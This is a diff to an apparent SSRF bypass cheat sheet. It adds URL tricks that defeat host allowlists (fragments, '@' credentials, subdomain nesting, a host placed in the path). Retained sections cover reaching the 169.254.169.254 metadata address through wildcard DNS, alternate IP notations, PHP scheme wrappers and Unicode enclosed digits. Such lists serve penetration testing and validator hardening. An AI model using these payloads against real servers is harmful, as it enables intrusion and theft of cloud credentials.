@@ -9,7 +9,34 @@
 
 ## Bypasses -
 
+#### URL fragment 
+
+Use the `#` character to indicate a URL fragment. For example:
+
+```http
+https://evil-host#expected-host
+```
+
+#### Embed credentials in a URL before the hostname, using the @ character. For example:
+
+```http
+https://expected-host:fakepassword@evil-host
+```
+#### Leverage DNS naming hierarchy
+
+```http
+https://expected-host.evil-host
+```
+#### Comply to regex used for whitelist by providing the req url as uri
+
+Here expected host is present and thereby it satisfies the whitelist & also is treated as directory portion of url.
+
+```http
+http://localhost/expectedhost.com
+```
+
 #### Use Hostnames Instead of IPs
+
 Sometimes, the developers just banned the use of 169.254.169.254 directly. In that case, we can simply use hostnames that resolve to the same IP address. 
 
 > Nip.io allows simple wildcard DNS for any IP address
@@ -64,7 +91,7 @@ Sometimes, specific IP addresses are blocked, such as 169.254.169.254. In this c
 
 > Use thsi website to convert IP address to all the 4 types of notation - https://www.abuseipdb.com/tools/ip-address-converter
 
-## SSRF Wrappers / URL Schema
+#### SSRF Wrappers / URL Schema
 
 The following wrappers are potentiall expected URL schema wrappers found within PHP environments (for some schema curl-wrappers would need to be enabled).
 
@@ -100,7 +127,7 @@ jar:http://0.0.0.0!/
 jar:ftp://local-domain.com!/
 ```
 
-## Enclosed Alphanumeric -
+#### Enclosed Alphanumeric -
 
 ```http
 http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
